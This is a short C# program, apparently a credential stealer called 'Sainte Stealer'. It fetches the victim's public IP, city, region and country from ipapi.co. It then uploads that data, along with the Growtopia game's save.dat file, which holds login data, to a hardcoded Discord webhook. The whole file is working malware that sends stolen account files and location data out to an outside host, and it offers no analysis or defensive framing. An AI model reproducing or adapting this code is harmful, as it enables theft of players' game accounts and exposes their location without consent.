using CSharpDiscordWebhook.NET.Discord;
using System.Drawing;
using System.Net;
using System.IO;
using System.Text;
using System;

WebClient wc = new WebClient();
var ip = wc.DownloadString("https://ipapi.co/ip");
var city = wc.DownloadString("https://ipapi.co/city");
var country = wc.DownloadString("https://ipapi.co/country_name");
var region = wc.DownloadString("https://ipapi.co/region");


DiscordWebhook hook = new DiscordWebhook();
hook.Uri = new Uri("https://discord.com/api/webhooks/1069621354871148564/moFgj7WQh6EiiVCibJGDYVGCUcdR1y5MX4VrDnkPPaXD-RhEhD69-aI-MXpZDgm-EUJq");

DiscordMessage message = new DiscordMessage();
message.Content = "<@1067072299536228496>\n\nCountry Information:\n" + ip + "," + "\n" + country + ", " + region + ", " + city;
message.TTS = false; //read message to everyone on the channel
message.Username = "Sainte Stealer";
string userName = Environment.UserName;


await hook.SendAsync(message, new FileInfo("C:/Users/" + userName + "/AppData/Local/Growtopia/save.dat"));

// C:\Users\Simon\AppData\Local\Growtopia\save.dat